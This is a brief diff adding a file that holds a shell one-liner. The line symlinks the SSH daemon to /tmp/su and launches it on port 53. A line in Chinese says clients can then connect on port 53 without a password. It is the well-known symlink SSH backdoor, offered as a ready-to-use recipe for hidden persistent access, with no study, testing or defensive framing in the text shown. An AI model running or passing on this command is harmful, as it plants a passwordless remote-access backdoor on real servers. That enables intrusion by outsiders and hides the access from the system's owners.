@@ -1,0 +1,3 @@
+ln -sf /usr/sbin/sshd /tmp/su;nohup /tmp/su -oPort=53 &
+
+客户端只需要访问服务器的53端口即可，不需要密码
